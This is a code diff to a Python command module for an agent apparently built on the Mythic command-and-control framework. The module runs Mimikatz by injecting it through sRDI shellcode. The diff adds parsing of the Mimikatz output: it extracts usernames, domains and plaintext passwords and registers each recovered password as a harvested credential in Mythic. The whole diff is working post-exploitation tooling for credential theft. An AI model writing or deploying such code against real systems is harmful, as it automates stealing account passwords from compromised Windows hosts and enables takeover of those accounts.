@@ -5,7 +5,7 @@ from sRDI import ShellcodeRDI
 from os import path
 from mythic_payloadtype_container.MythicRPC import *
 import base64
-
+import sys
 
 class MimikatzArguments(TaskArguments):
 
@@ -64,11 +64,39 @@ class MimikatzCommand(CommandBase):
     #   "files": array of dictionaries where each dictionary is a file registered as part of the task,
     #   "credentials": array of dictionaries where each dictionary is a credential created as part of the task.
     # }
-        # response = await MythicRPC().execute("get_responses", task_id=subtask["id"])
+        response = await MythicRPC().execute("get_responses", task_id=subtask["id"])
         
-        # for output in response.response.user_output:
-        #     pass
-        #     # parse the output strings here
+        for output in response.response["user_output"]:
+            
+            mimikatz_out = output.get("response", "")
+            comment = "{} from task {} on callback {}".format(
+                        output["task"].get("original_params"),
+                        output["task"].get("id"),
+                        output["task"].get("callback"))
+            if mimikatz_out != "":
+                lines = mimikatz_out.split("\r\n")
+                
+                for i in range(len(lines)):
+                    line = lines[i]
+                    if "Username" in line:
+                        # Check to see if Password is null
+                        if i+2 >= len(lines):
+                            break
+                        uname = line.split(" : ")[1].strip()
+                        realm = lines[i+1].split(" : ")[1].strip()
+                        passwd = lines[i+2].split(" : ")[1].strip()
+                        if passwd != "(null)":
+                            cred_resp = await MythicRPC().execute(
+                                "create_credential",
+                                task_id=output["task"].get("id"),
+                                credential_type="plaintext",
+                                account=uname,
+                                realm=realm,
+                                credential=passwd,
+                                comment=comment
+                            )
+                            if cred_resp.status != MythicStatus.Success:
+                                raise Exception("Failed to register credential")
         return task
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
